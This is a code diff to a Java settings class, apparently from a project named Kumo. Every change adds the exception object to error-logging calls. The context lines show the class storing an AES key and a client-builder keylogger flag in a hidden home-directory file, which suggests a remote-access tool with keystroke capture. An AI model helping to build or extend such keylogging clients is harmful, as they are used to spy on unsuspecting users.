@@ -42,7 +42,7 @@ public class PseudoBase implements Repository {
             writer.write(KumoSettings.AES_KEY + " ");
 
         } catch (IOException i) {
-            Logger.log(Level.ERROR, i.toString());
+            Logger.log(Level.ERROR, i.toString(), i);
         }
 
         File xrcs = new File(System.getProperty("user.home") + "/Kumo/.xrst");
@@ -55,7 +55,7 @@ public class PseudoBase implements Repository {
             writer.write("" + KumoSettings.AES_KEY + "\n ");
             writer.write("" + ClientBuilder.keylogger);
         } catch (IOException i) {
-            Logger.log(Level.ERROR, i.toString());
+            Logger.log(Level.ERROR, i.toString(), i);
         }
     }
 
@@ -93,7 +93,7 @@ public class PseudoBase implements Repository {
             }
             Logger.log(Level.INFO,"Kumo server settings loaded.");
         } catch (IOException e) {
-            Logger.log(Level.ERROR, e.toString());
+            Logger.log(Level.ERROR, e.toString(), e);
         }
     }
 
